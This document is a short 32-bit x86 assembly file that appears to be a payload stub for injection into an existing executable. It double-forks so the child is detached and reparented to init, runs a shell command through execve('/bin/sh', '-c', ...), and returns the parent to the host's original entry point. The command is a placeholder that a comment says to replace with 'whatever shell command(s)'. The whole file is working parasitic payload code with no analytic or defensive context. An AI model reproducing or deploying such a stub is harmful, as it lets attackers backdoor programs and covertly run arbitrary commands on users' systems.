.intel_syntax noprefix
.global _start
.code32
.text
_start:
    push ebp
    mov ebp, esp
    push eax                            # preserve eax

    push 2                              # sys_fork
    pop eax
    int 0x80

    test eax, eax
    jz second_fork

    pop eax                             # restore eax
    mov esp, ebp                        # this is the parent, return to the OEP
    pop ebp
    ret

second_fork:                            # fork again so we get reparented to init
    push 2                              # sys_fork
    pop eax
    int 0x80

    test eax, eax
    jnz exit
    call get_rel_argv_offset

argv0:  .asciz "/bin/sh"
argv1:  .asciz "-c"
argv2:  .asciz "echo hello"             # replace this line with whatever shell command(s).

get_rel_argv_offset:
    pop ebx                             # ebx holds relative offset of argv0
    xor edx, edx
    push edx                            # argv[3] = NULL
    mov edx, esp                        # reuse that null for envp
    lea ecx, [ebx + [argv2 - argv0]]
    push ecx                            # argv[2]
    lea ecx, [ebx + [argv1 - argv0]]
    push ecx                            # argv[1]
    push ebx                            # argv[0]
    mov ecx, esp                        # argv[]
    push 11                             # sys_execve
    pop eax
    int 0x80

exit:
    xor eax, eax
    mov ebx, eax                        # exit code 0
    inc eax                             # sys_exit
    int 0x80
